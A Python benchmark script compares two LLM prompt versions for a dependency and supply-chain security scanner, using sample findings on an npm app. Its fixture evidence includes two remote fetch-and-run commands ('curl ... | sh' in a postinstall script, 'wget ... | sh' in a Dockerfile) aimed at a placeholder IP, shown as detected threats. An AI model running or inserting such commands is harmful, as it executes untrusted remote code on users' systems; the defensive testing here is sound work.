"""Compare legacy v1 prompt vs compact structured v2 prompt (offline + optional --live Gemini run).

Usage:
    python scripts/benchmark_prompting.py          # offline token & grounding comparison
    python scripts/benchmark_prompting.py --live   # also run both against Gemini (uses .env key)
"""
from __future__ import annotations

import argparse
import json
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from guardian.explain import LEGACY_PROMPT, PROMPT_VERSION, build_prompt_messages, explain
from guardian.llm import LLM, estimate_tokens
from guardian.models import Evidence, Finding


def sample_findings() -> tuple[list[Finding], dict]:
    """Realistic 8-finding multi-category NodeGoat-style benchmark workload."""
    findings = [
        Finding(
            id="VULN-flatmap-stream@0.1.1-MAL-2018-0001", category="malicious-package",
            title="Malicious package flatmap-stream@0.1.1 steals cryptocurrency wallets", severity="CRITICAL",
            component="flatmap-stream@0.1.1", scope="runtime", location="package-lock.json", changed=True,
            dependency_paths=[["nodegoat@1.4.0", "express@4.17.1", "flatmap-stream@0.1.1"]],
            vuln_ids=["MAL-2018-0001", "GHSA-mh6f-8j2x-4483"], risk_score=100, risk_level="Critical",
            confidence="High (2 sources)",
            risk_rationale=["base 85 from severity CRITICAL", "known malicious package -> floor 95", "+10 runtime", "+10 new vs baseline"],
            evidence=[
                Evidence("OSV.dev", "flatmap-stream@0.1.1 is listed as malicious in OpenSSF Malicious Packages (MAL-2018-0001)"),
                Evidence("lockfile-diff", "flatmap-stream@0.1.1 injected transitively under express@4.17.1"),
            ],
        ),
        Finding(
            id="DIFF-INT-underscore@1.9.1", category="suspicious-change",
            title="underscore@1.9.1: integrity hash changed but version did not", severity="CRITICAL",
            component="underscore@1.9.1", scope="runtime", location="package-lock.json", changed=True,
            dependency_paths=[["nodegoat@1.4.0", "underscore@1.9.1"]], risk_score=100, risk_level="Critical",
            confidence="High",
            risk_rationale=["base 85 from severity CRITICAL", "+10 runtime", "+5 direct", "+10 new vs baseline"],
            evidence=[
                Evidence("lockfile-diff", "Same version, different content hash: tarball shifted from registry.npmjs.org to mirror.example", {"direct": True}),
                Evidence("lockfile-rule LF001", "resolved = https://mirror.example/underscore-1.9.1.tgz (expected https://registry.npmjs.org)"),
            ],
        ),
        Finding(
            id="SCRIPT-postinstall", category="suspicious-change",
            title="package.json 'postinstall' lifecycle script downloads/executes remote code", severity="CRITICAL",
            component="nodegoat@1.4.0", scope="build", location="package.json", changed=True,
            risk_score=95, risk_level="Critical", confidence="High",
            risk_rationale=["base 85 from severity CRITICAL", "+10 new vs baseline"],
            evidence=[Evidence("manifest-rule PJ002", '"postinstall": curl -s http://203.0.113.10/init.sh | sh')],
        ),
        Finding(
            id="CI-CI002-release.yml-L4", category="ci-cd",
            title="release.yml: pull_request_target checks out untrusted PR code", severity="CRITICAL",
            component=".github/workflows/release.yml", scope="ci", location=".github/workflows/release.yml:4", changed=True,
            risk_score=100, risk_level="Critical", confidence="High",
            risk_rationale=["base 85 from severity CRITICAL", "+10 CI step has access to repository secrets", "+10 new vs baseline"],
            evidence=[Evidence("workflow rule CI002", "Workflow runs with write token + secrets on pull_request_target and checks out PR head")],
        ),
        Finding(
            id="DOCKER-DF004-L9", category="container",
            title="Dockerfile downloads a remote script and pipes it to a shell", severity="CRITICAL",
            component="Dockerfile", scope="build", location="Dockerfile:9", changed=True,
            risk_score=95, risk_level="Critical", confidence="High",
            risk_rationale=["base 85 from severity CRITICAL", "+10 new vs baseline"],
            evidence=[Evidence("Dockerfile rule DF004", "RUN wget -qO- http://203.0.113.10/setup.sh | sh - unauthenticated remote code in build")],
        ),
        Finding(
            id="TYPO-expresss@4.17.1", category="suspicious-change",
            title="Possible typosquat: 'expresss' imitates popular package 'express'", severity="HIGH",
            component="expresss@4.17.1", scope="runtime", location="package-lock.json", changed=True,
            dependency_paths=[["nodegoat@1.4.0", "expresss@4.17.1"]], risk_score=90, risk_level="Critical",
            confidence="Medium-High",
            risk_rationale=["base 65 from severity HIGH", "+10 runtime", "+5 direct", "+10 new vs baseline"],
            evidence=[
                Evidence("typosquat-rule", "Edit distance between 'expresss' and 'express' is 1", {"direct": True}),
                Evidence("npm downloads API", "'expresss': 12 downloads last week vs 'express': 32,000,000"),
            ],
        ),
        Finding(
            id="VULN-lodash@4.17.20-GHSA-35jh-r3h4-6jhm", category="vulnerability",
            title="Command Injection in lodash", severity="HIGH",
            component="lodash@4.17.20", scope="runtime", location="package-lock.json",
            dependency_paths=[["nodegoat@1.4.0", "lodash@4.17.20"]],
            vuln_ids=["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"], cvss=7.2, fixed_version="4.17.21",
            kev=True, epss=0.21, epss_percentile=0.97, risk_score=100, risk_level="Critical",
            confidence="High (2 sources)",
            risk_rationale=["base 72 from CVSS 7.2", "+10 runtime", "+5 direct", "+15 CISA KEV"],
            evidence=[
                Evidence("OSV.dev", "lodash@4.17.20 is affected by GHSA-35jh-r3h4-6jhm (CVE-2021-23337); CVSS 7.2; fixed in 4.17.21", {"direct": True}),
                Evidence("GitHub Advisory DB (npm audit API)", "GHSA-35jh-r3h4-6jhm also lists lodash@4.17.20 (<4.17.21)"),
                Evidence("CISA KEV", "CVE-2021-23337 is in CISA Known Exploited Vulnerabilities"),
                Evidence("FIRST EPSS", "CVE-2021-23337: 21.0% probability of exploitation in next 30 days (p97)"),
            ],
        ),
        Finding(
            id="VULN-minimist@1.2.0-GHSA-xvch-5gv4-984h", category="vulnerability",
            title="Prototype Pollution in minimist", severity="CRITICAL",
            component="minimist@1.2.0", scope="dev", location="package-lock.json",
            dependency_paths=[["nodegoat@1.4.0", "mocha@7.1.0", "mkdirp@0.5.1", "minimist@1.2.0"]],
            vuln_ids=["GHSA-xvch-5gv4-984h", "CVE-2021-44906"], cvss=9.8, fixed_version="1.2.6",
            epss=0.004, epss_percentile=0.60, risk_score=68, risk_level="High",
            confidence="High (2 sources)",
            risk_rationale=["base 98 from CVSS 9.8", "-25 dev-only", "-5 low EPSS 0.40%"],
            evidence=[
                Evidence("OSV.dev", "minimist@1.2.0 is affected by GHSA-xvch-5gv4-984h (CVE-2021-44906); CVSS 9.8; fixed in 1.2.6"),
                Evidence("deps.dev (Open Source Insights)", "deps.dev also lists GHSA-xvch-5gv4-984h for minimist@1.2.0"),
            ],
        ),
    ]
    context = {
        "app": "nodegoat@1.4.0",
        "ecosystem": "npm (Node.js)",
        "deployment": "Docker image (node:12-alpine, node:latest); production install excludes devDependencies",
        "inventory": {
            "total_components": 1479, "unique_name_versions": 1210, "direct": 31, "transitive": 1448,
            "runtime": 612, "runtime_unique_name_versions": 540, "dev_only": 867,
            "edges": 4120, "max_depth": 13, "unreachable": 0, "with_install_scripts": 14,
        },
        "changes_vs_baseline": {
            "new_findings": 6,
            "added": ["expresss@4.17.1", "flatmap-stream@0.1.1"] + [f"helper-{i}@1.0.0" for i in range(25)],
            "removed": [f"old-pkg-{i}@0.9.0" for i in range(12)],
            "version_changed": [f"dep-{i}@1.0.0 -> 1.0.1" for i in range(15)],
            "integrity_changed": ["underscore@1.9.1"],
            "source_changed": ["underscore@1.9.1: registry.npmjs.org -> mirror.example"],
            "scripts_changed": ["package.json script 'postinstall'"],
            "new_images": ["node:latest"],
            "new_workflows": [".github/workflows/release.yml"],
        },
    }
    return findings, context


def legacy_compact(f: Finding) -> dict:
    return {
        "id": f.id, "category": f.category, "title": f.title, "component": f.component,
        "scope": f.scope, "location": f.location, "severity": f.severity,
        "risk_score": f.risk_score, "risk_level": f.risk_level,
        "changed_vs_baseline": f.changed,
        "dependency_path": " > ".join(f.dependency_paths[0]) if f.dependency_paths else "",
        "advisory_ids": f.vuln_ids[:4], "cvss": f.cvss, "fixed_version": f.fixed_version,
        "evidence": [f"[{e.source}] {e.detail}" for e in f.evidence],
    }


def main() -> None:
    ap = argparse.ArgumentParser(description="Benchmark v1 legacy vs v2 compact structured prompting")
    ap.add_argument("--live", action="store_true", help="Also run live Gemini API calls (requires GEMINI_API_KEY in .env)")
    args = ap.parse_args()

    findings, ctx = sample_findings()
    v1_prompt = LEGACY_PROMPT.format(
        context=json.dumps(ctx, indent=1),
        findings=json.dumps([legacy_compact(f) for f in findings], indent=1),
    )
    v2_sys, v2_user = build_prompt_messages(findings, ctx)
    v2_full = v2_sys + "\n" + v2_user

    t1, t2 = estimate_tokens(v1_prompt), estimate_tokens(v2_full)
    t2_dyn = estimate_tokens(v2_user)
    saved = t1 - t2
    pct = (saved / t1) * 100 if t1 else 0.0

    print("=== Prompt Efficiency Benchmark (8 multi-category findings) ===")
    print(f"Legacy v1 prompt   : {len(v1_prompt):>6,} chars | ~{t1:>5,} tokens (all dynamic, uncacheable)")
    print(f"New v2 prompt      : {len(v2_full):>6,} chars | ~{t2:>5,} tokens "
          f"(static system ~{estimate_tokens(v2_sys):,} + dynamic user ~{t2_dyn:,})")
    print(f"Input token savings: {saved:+,} tokens ({pct:.1f}% reduction; dynamic portion -{((t1 - t2_dyn) / t1) * 100:.1f}%)")
    print()
    print("=== Grounding Signals Included in Prompt ===")
    for label, needle in [
        ("Deterministic risk_rationale", "score_why:"),
        ("CISA KEV / EPSS explicit metadata", "exploit=CISA KEV"),
        ("Multi-source confidence", "conf=High (2 sources)"),
        ("Direct vs transitive flag", "direct=yes"),
        ("Bounded baseline diff", "(+22 more)"),
        ("Indexed evidence sources", "[0|OSV.dev]"),
    ]:
        print(f"  {label:<36} v1={'YES' if needle in v1_prompt else 'no ':<3} | v2={'YES' if needle in v2_full else 'no '}")

    if not args.live:
        return

    print(f"\n=== Live Gemini Benchmark ({PROMPT_VERSION}) ===")
    with tempfile.TemporaryDirectory() as td:
        llm_v1 = LLM(Path(td) / "v1")
        if not llm_v1.enabled:
            sys.exit("GEMINI_API_KEY not set in .env; cannot run --live")
        t0 = time.time()
        r1 = llm_v1.generate_json(v1_prompt)
        d1 = time.time() - t0
        print(f"v1 live: ok={r1 is not None} model={llm_v1.model} time={d1:.2f}s usage={llm_v1.usage}")

        llm_v2 = LLM(Path(td) / "v2")
        t0 = time.time()
        st = explain(findings, ctx, llm_v2, top_n=8)
        d2 = time.time() - t0
        rejected = sum(len((f.ai or {}).get("evidence_claims_rejected") or []) for f in findings)
        invented = sum(len((f.ai or {}).get("unverified_ids_removed") or []) for f in findings)
        print(f"v2 live: mode={st['mode']} model={st['model']} time={d2:.2f}s usage={st['token_usage']} "
              f"rejected_claims={rejected} invented_ids={invented}")


if __name__ == "__main__":
    main()
